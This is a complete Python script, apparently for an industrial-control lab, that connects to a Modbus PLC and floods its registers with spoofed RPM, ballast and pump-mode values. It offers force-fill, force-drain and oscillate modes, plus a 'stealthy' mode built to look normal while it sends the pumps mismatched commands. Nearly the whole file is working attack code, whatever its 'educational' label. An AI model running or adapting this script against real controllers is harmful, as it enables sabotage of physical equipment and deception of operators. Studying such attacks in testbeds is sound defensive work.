#!/usr/bin/env python3
"""
Modbus PLC Attack Script
Educational/Testing purpose only

This script demonstrates various attack patterns on the PLC:
- force_fill: Force ballast low + FILL mode
- force_drain: Force ballast high + DRAIN mode
- oscillate: Rapidly alternate between FILL/DRAIN states
- stealthy: Random values within normal range with mismatched pump modes
"""

from pymodbus.client import ModbusTcpClient
import time
import random
import logging
import argparse

logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)
log = logging.getLogger(__name__)

# =========================
# Register Map
# =========================
RPM_REGISTER = 0          # Legacy (not used by HMI)
RPM_SENSOR_REGISTER = 10  # HMI reads this for RPM (Field Zone sensor)
BALLAST_REGISTER = 1
PUMP_MODE_REGISTER = 2

# =========================
# Engine Logic Constants
# =========================
BALLAST_MIN = 40.0
BALLAST_MAX = 50.0
BALLAST_MIN_X10 = int(BALLAST_MIN * 10)  # 400
BALLAST_MAX_X10 = int(BALLAST_MAX * 10)  # 500

# Pump Modes
FILL = 1
HOLD = 0
DRAIN = -1

# RPM range
RPM_MIN = 0
RPM_MAX = 3000

# Oscillate mode configuration
SWITCH_EVERY = 20  # loops before switching target


def encode_uint16(v: int) -> int:
    """Convert signed int to uint16 for Modbus (matches codebase style)"""
    return v & 0xFFFF


class ModbusAttacker:
    def __init__(self, plc_host="localhost", plc_port=502,
                 attack_mode="oscillate", interval=1.5, duration=60):
        self.plc_host = plc_host
        self.plc_port = plc_port
        self.attack_mode = attack_mode
        self.interval = interval
        self.duration = duration
        self.client = ModbusTcpClient(plc_host, port=plc_port)

    def connect(self):
        """Connect to PLC"""
        if self.client.connect():
            log.info(f"[Attacker] Connected to PLC at {self.plc_host}:{self.plc_port}")
            return True
        log.error(f"[Attacker] Failed to connect to PLC")
        return False

    def safe_write_register(self, addr: int, value: int, label: str) -> bool:
        """Write to holding register with error handling"""
        try:
            resp = self.client.write_register(addr, value)
            if resp.isError():
                log.warning(f"Write error: {label} (addr={addr}, value={value})")
                return False
            return True
        except Exception as e:
            log.error(f"Exception on write {label}: {e}")
            return False

    def choose_attack_values(self, loop_i: int):
        """
        Generate attack values based on attack mode
        Returns: (rpm_value, ballast_x10, pump_mode)
        """
        rpm_value = random.randint(RPM_MIN, RPM_MAX)

        if self.attack_mode == "force_fill":
            # Force ballast low to trigger continuous FILL
            ballast_x10 = random.choice([400, 401, 402])  # 40.0~40.2
            pump_mode = FILL

        elif self.attack_mode == "force_drain":
            # Force ballast high to trigger continuous DRAIN
            ballast_x10 = random.choice([498, 499, 500])  # 49.8~50.0
            pump_mode = DRAIN

        elif self.attack_mode == "oscillate":
            # Rapidly alternate between FILL and DRAIN states
            phase = (loop_i // SWITCH_EVERY) % 2
            if phase == 0:
                ballast_x10 = random.choice([400, 401, 402])  # Low ballast
                pump_mode = FILL
            else:
                ballast_x10 = random.choice([498, 499, 500])  # High ballast
                pump_mode = DRAIN

        elif self.attack_mode == "stealthy":
            # Values appear normal but pump mode is random (causes confusion)
            ballast_x10 = random.randint(BALLAST_MIN_X10, BALLAST_MAX_X10)
            pump_mode = random.choice([FILL, HOLD, DRAIN])

        else:
            # Fallback: completely random
            ballast_x10 = random.randint(BALLAST_MIN_X10, BALLAST_MAX_X10)
            pump_mode = random.choice([FILL, HOLD, DRAIN])

        # Clamp ballast to safe range
        ballast_x10 = max(BALLAST_MIN_X10, min(BALLAST_MAX_X10, ballast_x10))

        return rpm_value, ballast_x10, pump_mode

    def run_attack(self):
        """Execute the attack"""
        if not self.connect():
            return

        log.info("[Attacker] Starting Modbus Write Storm")
        log.info(f"    Mode: {self.attack_mode}")
        log.info(f"    Interval: {self.interval}s")
        log.info(f"    Duration: {self.duration}s")
        log.info("")

        start_time = time.time()
        attempted = 0
        successful = 0
        loop_i = 0

        try:
            while time.time() - start_time < self.duration:
                # Generate attack values
                rpm_value, ballast_x10, pump_mode = self.choose_attack_values(loop_i)
                pump_mode_u16 = encode_uint16(pump_mode)  # Convert -1 → 65535

                # Execute writes
                r1 = self.safe_write_register(RPM_REGISTER, rpm_value, "RPM")
                r2 = self.safe_write_register(RPM_SENSOR_REGISTER, rpm_value, "RPM_Sensor")
                r3 = self.safe_write_register(BALLAST_REGISTER, ballast_x10, "Ballast")
                r4 = self.safe_write_register(PUMP_MODE_REGISTER, pump_mode_u16, "PumpMode")

                attempted += 4
                successful += sum([r1, r2, r3, r4])

                # Display attack status
                ballast_val = ballast_x10 / 10.0
                mode_str = {1: "FILL(+1)", 0: "HOLD(0)", -1: "DRAIN(-1)"}.get(pump_mode, str(pump_mode))

                log.info(
                    f"[ATTACK] RPM={rpm_value:4d}, "
                    f"Ballast={ballast_val:4.1f}, "
                    f"PumpMode={mode_str} (u16={pump_mode_u16})"
                )

                loop_i += 1
                time.sleep(self.interval)

        except KeyboardInterrupt:
            log.info("\n[Attacker] Attack interrupted by user")

        finally:
            self.client.close()
            elapsed = time.time() - start_time

            log.info("")
            log.info("[Attacker] Attack finished")
            log.info(f"    Elapsed: {elapsed:.1f}s")
            log.info(f"    Writes attempted: {attempted}")
            log.info(f"    Writes successful: {successful}")
            log.info(f"    Success rate: {100*successful/attempted if attempted > 0 else 0:.1f}%")


def main():
    parser = argparse.ArgumentParser(
        description='Modbus PLC Attack Script (Educational/Testing Only)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Modes:
  force_fill    Force ballast low + continuous FILL mode
  force_drain   Force ballast high + continuous DRAIN mode
  oscillate     Rapidly alternate FILL/DRAIN (most visible)
  stealthy      Normal-looking values with mismatched pump modes

Example:
  python modbus_attacker.py --plc-ip localhost --mode oscillate --duration 30
        """
    )

    parser.add_argument('--plc-ip', default='localhost',
                        help='PLC IP address (default: localhost)')
    parser.add_argument('--plc-port', type=int, default=502,
                        help='PLC Modbus port (default: 502)')
    parser.add_argument('--mode', choices=['force_fill', 'force_drain', 'oscillate', 'stealthy'],
                        default='oscillate',
                        help='Attack mode (default: oscillate)')
    parser.add_argument('--interval', type=float, default=1.5,
                        help='Write interval in seconds (default: 1.5)')
    parser.add_argument('--duration', type=int, default=60,
                        help='Attack duration in seconds (default: 60)')

    args = parser.parse_args()

    attacker = ModbusAttacker(
        plc_host=args.plc_ip,
        plc_port=args.plc_port,
        attack_mode=args.mode,
        interval=args.interval,
        duration=args.duration
    )

    attacker.run_attack()


if __name__ == "__main__":
    main()
